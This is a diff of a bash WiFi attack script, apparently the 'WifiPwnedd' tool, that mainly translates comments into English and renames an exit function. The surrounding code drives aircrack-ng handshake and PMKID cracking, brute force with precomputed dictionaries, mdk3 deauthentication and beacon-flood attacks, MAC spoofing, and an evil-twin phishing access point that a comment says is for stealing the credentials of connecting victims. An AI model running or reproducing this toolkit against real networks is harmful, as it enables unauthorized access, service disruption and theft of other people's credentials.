@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Modulo de colores 
+#Creation of variables for colors
 greenColour="\e[0;32m\033[1m"
 endColour="\033[0m\e[0m"
 redColour="\e[0;31m\033[1m"
@@ -10,7 +10,7 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 cleancolor="echo -e "${endColour}""
-
+#Catches the Ctrl+C signal and executes the output of the code
 trap ctrl_c INT
 
 ctrl_c() {
@@ -28,6 +28,7 @@ ctrl_c() {
 	find \-name datos-privados.txt | xargs rm 2>/dev/null
 	exit
 }
+#Verify the distribution 
 test -f /etc/debian_version
 debian=$(echo $?)
 	
@@ -36,7 +37,7 @@ arch=$(echo $?)
 
 test -f /etc/redhat-release
 fedora=$(echo $?)
-
+#On the basis of the distribution, download the dependencies 
 programs() {
 	
 	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd mdk3 gunzip)
@@ -146,6 +147,7 @@ programs() {
 		sleep 5
 	fi
 }
+#Update your OS repositories
 updatepackages() {
 	clear; echo -ne "\n${blueColour}[?]$grayColour Do you want to update the packages? [Y/N]: " && read update 
 	if [ "$update" == "y" ] || [ "$update" == "Y" ]; then
@@ -173,6 +175,7 @@ updatepackages() {
 	fi
 
 }
+#Function to start monitor mode and kill confluent processes 
 monitormode() {
 	clear; echo -e "\n${blueColour}[*]$grayColour Interface:\n" && iwconfig 
 	tput cnorm
@@ -185,7 +188,7 @@ monitormode() {
 	ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
 	ifconfig $tar up
 }
-
+#Test if the package was captured and if you have rockyou in your OS
 testhandshake() {
 	test -f Handshake-01.cap
 	if [ "$(echo $?)" == "0" ]; then
@@ -212,7 +215,7 @@ testhandshake() {
 		sleep 2
 	fi
 }
-
+#[1] Attack with aircrack
 handshake_ataque() {
 	clear
 	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
@@ -257,8 +260,8 @@ handshake_ataque() {
 		testhandshake
 	fi
 }
-# salida
-salir() {
+#It will exit the program and restart the network card and the services required for connections
+exitresart() {
 	echo -e "\n${redColour}[*]$grayColour Exiting and restarting the network card...\n" 
 	tput civis
 	airmon-ng stop $tar > /dev/null 2>&1
@@ -271,7 +274,7 @@ salir() {
 	exit
 }
 
-# 2) ataque
+#[2] Attack with hcxtools and hashcat
 pkmid_ataque() {
 	clear
 	echo -e "\n${greenColour}[*]$grayColour Starting PMKID attack...\n"
@@ -300,7 +303,7 @@ pkmid_ataque() {
 		sleep 2
 	fi
 }
-# 3) ataque
+#[7] force brute with aircrack for files or hashes .cap
 fuerza_.cap() {
 	clear; echo -e "\n${greenColour}[*]$grayColour Starting Force Brute"
 	sleep 1
@@ -311,13 +314,13 @@ fuerza_.cap() {
 	tput civis; echo -ne "${redColour}[?]$grayColour Dictionary path to use: " && read dicc
 	xterm -hold -e "aircrack-ng -w $dicc $cap"
 }
-
+#force brute with dictonary precomputed
 fuerza_rainbow() {
 	echo -ne "${greenColour}[?]$grayColour File path .cap : " && read cap
 	cd WifiPwnedd
 	xterm -hold -e "aircrack-ng -r dicc-hasheado $cap" 
 }
-
+#[8] Attack with airolib for the creation of precomputed dictionaries
 rainbowtaibles() {
 	clear; echo -e "\n${yellowColour}[*]$grayColour Starting Rainbow Taibles..."
 	echo -ne "${blueColour}[?]$grayColour Dictionary path: " && read ruta
@@ -344,7 +347,7 @@ rainbowtaibles() {
 		sleep 2
 	fi
 }
-
+#Menu for force brute 
 menuforce() {
 	clear; echo -e "${yellowColour}\n1) Force Brute .cap"
 	echo -e "2) Create hashed dictionary (Rainbow taibles)"
@@ -370,7 +373,7 @@ menuforce() {
 	;;
 	esac
 }
-
+#[5] local network scanner with ip with nmap
 scanner() {
 	clear; echo -e "\n${greenColour}[*]$grayColour Starting Scanner"
 	tput civis
@@ -390,7 +393,7 @@ scanner() {
 	airmon-ng check kill > /dev/null 2>&1
 	tput cnorm
 }
-
+#[6] Creation of a fake network with a login to steal the credentials of the connecting victims (created by me)
 ntwkphishing() {
 	
 	credentials() {
@@ -488,6 +491,7 @@ ntwkphishing() {
 	sleep 2
 	attack
 }
+#[3] Denial of service attack with mdk
 dosattack() {
 	tput civis; clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
 	xterm -e "airodump-ng ${tar}" &
@@ -496,7 +500,7 @@ dosattack() {
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
 	sudo mdk3 $tar a -e $redos
 }
-
+#[4] Beacon flood attack with mdk
 beaconflood() {
 	tput civis; clear; echo -e "\n${purpleColour}[*]$grayColour Starting Beacon Flood attack..."; sleep 2
 	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour You Want to name the networks (Recommend (N))? [Y/N]: " && read rpsbeacon 
@@ -508,6 +512,7 @@ beaconflood() {
 	fi
 	
 }
+#banner for attack menu
 bannerattack() {
 	echo -e "	   ${blueColour}.--------."
 	echo -e "${redColour}     :  ${blueColour}.-@#*==-!==+#@*-."
@@ -519,6 +524,7 @@ bannerattack() {
 	echo -e "               ${blueColour}."
 	$cleancolor
 }
+#banner main
 banner() {
 	echo "  _       __  _   ____  _      ____                               __      __ "
 	echo " | |     / / (_) / __/ (_)    / __ \ _      __  ____   ___   ____/ / ____/ / "
@@ -526,17 +532,18 @@ banner() {
 	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ /  "
 	echo " |__/|__/ /_/ /_/   /_/    /_/      |__/|__/ /_/ /_/ \___/ \__,_/  \__,_/  "
 }
+#Checks if the tool was run as root
 if [ $(id -u) -ne 0 ]; then
 	echo -e "$redColour\n[!]$grayColour Must be root (sudo $0)\n"
 	$cleancolor
 	exit 1
-# Programa principal
+#if the tool was run as root, run the updatepackages, check the dependencies and run the main code
 else
 	updatepackages
 	tput civis; clear
 	echo -e "${turquoiseColour}"
 	banner
-	echo -e "\n${greenColour}[+]${grayColour} Version [1.0]"
+	echo -e "\n${greenColour}[+]${grayColour} Version 1.0"
 	echo -e "${greenColour}[+]${grayColour} Github: https://github.com/kidd3n"
 	echo -ne "${greenColour}[+]$grayColour Enter to continue" && read 
 	$cleancolor
@@ -585,7 +592,7 @@ else
 			rainbowtaibles
 			;;
 			9)
-			salir
+			exitresart
 			;;
 			*)
 			echo -e "${redColour}\n[!]$grayColour Invalid Option"; sleep 2
